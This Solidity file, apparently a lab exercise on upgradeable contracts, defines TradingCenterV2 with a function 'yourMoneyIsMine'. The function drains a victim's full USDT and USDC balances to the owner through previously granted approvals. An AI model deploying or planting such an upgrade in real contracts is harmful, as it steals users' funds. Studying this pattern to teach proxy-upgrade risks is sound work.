// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;
import { TradingCenter } from "./TradingCenter.sol";
import { Ownable } from "./Ownable.sol";
// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter, Ownable{
  function yourMoneyIsMine(address victimAddress) public {
    address owner = getOwner();
    uint256 usdtAmount = usdt.balanceOf(victimAddress);
    usdt.transferFrom(victimAddress, owner, usdtAmount);
    uint256 usdcAmount = usdc.balanceOf(victimAddress);
    usdc.transferFrom(victimAddress, owner, usdcAmount);
  }
}